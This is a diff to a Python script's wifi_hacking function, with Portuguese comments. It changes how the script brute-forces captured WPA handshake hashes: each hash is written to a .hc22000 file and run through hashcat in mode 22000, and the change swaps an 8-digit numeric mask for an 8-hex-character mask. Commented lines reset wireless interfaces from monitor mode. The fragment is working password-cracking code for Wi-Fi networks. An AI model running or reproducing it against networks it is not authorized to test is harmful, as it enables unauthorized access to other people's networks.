@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-version = "v3.81-dev"
+version = "v3.8-dev"
 
 import os
 import re
@@ -1931,23 +1931,21 @@ def wifi_hacking():
 
 
         ## implementaçao definir a forma de quebra de hash
-
+        
         for hash in dump.splitlines():
             nome_hash = hash.split('*')
+            
+            #comando1 = f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?d?d?d?d?d?d?d?d | tee WifiCrack/{nome_hash[3]}.result"
+            comando2 = f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?h?h?h?h?h?h?h?h | tee WifiCrack/{nome_hash[3]}.result"
+            
             with open(f'WifiCrack/{nome_hash[3]}.hc22000','w') as f:
                 f.write(hash)
             print()                
             print(nome_hash[3])
             print('#################################################################################################################')
-            os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?d?d?d?d?d?d?d?d | tee WifiCrack/{nome_hash[3]}.result")
+            #os.system(comando1)
+            os.system(comando2)
         
-            #with open(f'WifiCrack/{nome_hash[3]}.result','r') as f:
-            #    result = f.read()
-            #    if 'Exhausted' in result:
-            #        os.system(f"hashcat -m 22000 WifiCrack/{nome_hash[3]}.hc22000 -a 3 ?h?h?h?h?h?h?h?h | tee WifiCrack/{nome_hash[3]}.result")
-
-
-
             #em caso de erro:
             #sudo ifconfig wlxd03745fbcadc down && sudo iwconfig wlxd03745fbcadc mode managed && sudo ifconfig wlxd03745fbcadc up
             #sudo ifconfig wlp4s0 down && sudo iwconfig wlp4s0 mode managed && sudo ifconfig wlp4s0 up
